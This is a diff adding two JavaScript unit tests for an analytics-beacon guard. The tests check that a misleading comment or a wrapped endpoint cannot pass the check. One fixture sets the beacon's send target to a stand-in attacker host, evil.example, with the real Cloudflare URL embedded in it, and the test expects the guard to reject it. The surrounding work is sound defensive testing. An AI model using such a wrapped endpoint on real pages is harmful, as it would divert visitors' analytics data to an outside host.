@@ -318,3 +318,45 @@ test("checkAnalyticsBeacon: a beacon that does not pin send.to is rejected", () 
     "a beacon that does not pin the manual-embed upload endpoint must be rejected",
   );
 });
+
+test("checkAnalyticsBeacon: a COMMENT mentioning the right values cannot satisfy the guard", () => {
+  // Caught by ai-review on PR #749, and reproduced before fixing: the guard used to text-scan for
+  // `__cfBeacon =` and `load: "multi"` INDEPENDENTLY, and cf-analytics.js documents both in its header
+  // comment. So flipping the REAL assignment to "single" — which hands the page back to Mintlify's
+  // beacon and returns us to zero events — still satisfied a text scan, because the prose alone
+  // matched. A guard that a comment can satisfy is not a guard. This is why the check now EXECUTES the
+  // file and inspects what it actually did (see [[guard-scripts-must-parse-not-scan]]).
+  const sabotaged = [
+    `// Resetting the global to \`load: "multi"\` is what lets a second beacon run at all.`,
+    `(function(){window.__cfBeacon={load:"single"};`,
+    `const s=document.createElement("script");s.defer=true;`,
+    `s.src="https://static.cloudflareinsights.com/beacon.min.js";`,
+    `s.setAttribute("data-cf-beacon",JSON.stringify({token:"${FAKE_TOKEN}",`,
+    `send:{to:"https://cloudflareinsights.com/cdn-cgi/rum"}}));`,
+    `document.head.appendChild(s);})();`,
+  ].join("\n");
+  assert.ok(
+    checkAnalyticsBeacon(sabotaged).some((e) => e.includes("__cfBeacon")),
+    'a real `load: "single"` assignment must be rejected even when a comment says "multi"',
+  );
+});
+
+test("checkAnalyticsBeacon: an endpoint that merely CONTAINS the pinned URL is rejected", () => {
+  // The endpoint used to be checked with a substring scan, which CodeQL flagged as
+  // js/incomplete-url-substring-sanitization — correctly: a substring match accepts any host that has
+  // the real URL somewhere inside it, so a typosquatted or wrapping endpoint would sail through the
+  // one guard whose whole job is pinning where our data goes. Compare it exactly.
+  const wrappedEndpoint =
+    `(function(){window.__cfBeacon={load:"multi"};` +
+    `const s=document.createElement("script");s.defer=true;` +
+    `s.src="https://static.cloudflareinsights.com/beacon.min.js";` +
+    `s.setAttribute("data-cf-beacon",JSON.stringify({token:"${FAKE_TOKEN}",` +
+    `send:{to:"https://evil.example/?u=https://cloudflareinsights.com/cdn-cgi/rum"}}));` +
+    `document.head.appendChild(s);})();`;
+  assert.ok(
+    checkAnalyticsBeacon(wrappedEndpoint).some((e) =>
+      e.includes("cloudflareinsights.com/cdn-cgi/rum"),
+    ),
+    "an endpoint that only contains the pinned URL must be rejected",
+  );
+});
